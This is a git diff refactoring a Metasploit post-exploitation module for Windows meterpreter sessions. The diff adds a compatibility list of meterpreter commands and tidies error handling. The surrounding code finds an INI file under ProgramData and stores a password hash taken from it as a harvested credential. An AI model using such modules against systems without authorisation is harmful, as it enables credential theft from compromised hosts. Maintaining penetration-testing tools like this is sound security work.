@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'rex/parser/ini'
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
 
@@ -20,7 +18,18 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [ 'Robert Kugler / robertchrk'],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              core_channel_write
+              stdapi_fs_stat
+            ]
+          }
+        }
       )
     )
   end
@@ -31,13 +40,11 @@ class MetasploitModule < Msf::Post
   end
 
   def check_programdata(path)
-    begin
-      client.fs.file.stat(path)
-      print_status("Found file at #{path}")
-      get_ini(path)
-    rescue StandardError
-      print_error("Error reading or processing #{path}.")
-    end
+    client.fs.file.stat(path)
+    print_status("Found file at #{path}")
+    get_ini(path)
+  rescue StandardError
+    print_error("Error reading or processing #{path}.")
   end
 
   def get_ini(filename)
@@ -57,7 +64,7 @@ class MetasploitModule < Msf::Post
       workspace_id: myworkspace_id,
       origin_type: :session,
       session_id: session_db_id,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       private_type: :nonreplayable_hash,
       jtr_format: 'Raw-MD5u', # hard coded since hash identifier wont know its unicode
       private_data: passwd,
